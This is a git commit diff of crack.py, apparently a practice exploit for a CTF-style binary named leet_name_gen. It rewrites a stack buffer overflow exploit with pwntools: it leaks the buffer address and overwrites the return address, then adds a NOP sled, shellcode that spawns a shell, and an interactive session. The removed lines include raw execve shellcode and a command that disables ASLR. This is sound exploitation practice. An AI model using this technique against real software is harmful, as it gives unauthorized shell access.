34050c6be67a815644693507d5daa83ca75a11cd
Vincenzo Maffione <v.maffione@gmail.com>
2019-03-17 19:37:49 +0100

    leet_name_gen: add crack.py

--- leet_name_gen/crack.py
+++ leet_name_gen/crack.py
@@ -1,56 +1,84 @@
 #!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template sum
+from pwn import *
 
-import binascii
-import time
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('leet_name_gen')
+context.terminal = "terminator -x".split()
 
-# Make sure ASLR is disabled:
-#  $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
 
-if False:  # Set this to True to have the time to start and setup GDB
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        pass
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+break *0x{exe.symbols.main:x}
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX disabled
+# PIE:      No PIE (0x400000)
+# RWX:      Has RWX segments
+
+io = start()
+
+# shellcode = asm(shellcraft.sh())
+# payload = fit({
+#     32: 0xdeadbeef,
+#     'iaaa': [1, 2, 'Hello', 3]
+# }, length=128)
+# io.send(payload)
+# flag = io.recv(...)
+# log.success(flag)
+
+msg = io.recvuntil("License code")
+print(msg)
+leakline = io.recvline()
+leakline = leakline.rstrip()
+leakline = leakline.rstrip(']')
+buf_addr = int(leakline)
+print("buffer@%x" % buf_addr)
 
 # For this binary, the return address (from main to
 # libc_start_main) is 72 bytes ahead of the start of
 # the vulnerable buffer (observed with GDB).
 bytes_to_ret_addr = 72
 nop_sled_size = 128
-# With ASLR disabled, we observed with GDB that the
-# vulnerable buffer starts at this address.
-buf_addr = 0x00007fffffffe810
 # Compute a new return address so that it points in the middle
 # of the NOP sled.
 ret_addr = buf_addr + bytes_to_ret_addr + 8 + nop_sled_size / 2
-ret_addr_str = "%016x" % ret_addr
 
 # Fill arbritrary characters in "char buffer[0x32]", up to
 # the stack location immediately before the return address
 # (return from main to libc_start_main), but also insert a
 # string terminator to make sure that the generate_l33t_name()
 # function does not corrupt the stack.
-content = 'A' * (bytes_to_ret_addr/2)
-content += '\00' * (bytes_to_ret_addr/2)
+vector = cyclic(bytes_to_ret_addr/2)
+vector += '\00' * (bytes_to_ret_addr/2)
+vector += p64(ret_addr)
+vector += asm("nop") * nop_sled_size
+vector += asm(shellcraft.sh())
+io.sendline(vector)
 
 # Append the return address (in little endian)
-content += binascii.unhexlify(ret_addr_str)[::-1]
-
-# Append the NOP sled
-content += '\x90' * nop_sled_size
-
-# Append the shellcode (just google x86_64 shellcode)
-content += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
-
-# Output on stdout
-print(content)
-
-# Command:
-#
-#  $ ( ./crack.py; cat ) | ./leet_name_gen
-#
-# The ./crack.py produces the buffer content that causes buffer overflow
-# and injects the shellcode.
-# The 'cat' command is used to keep stdin and stdout open once the
-# shell is open, so that it is possible to interact with it.
+# Switch to interactive mode to use the shell.
+io.interactive()
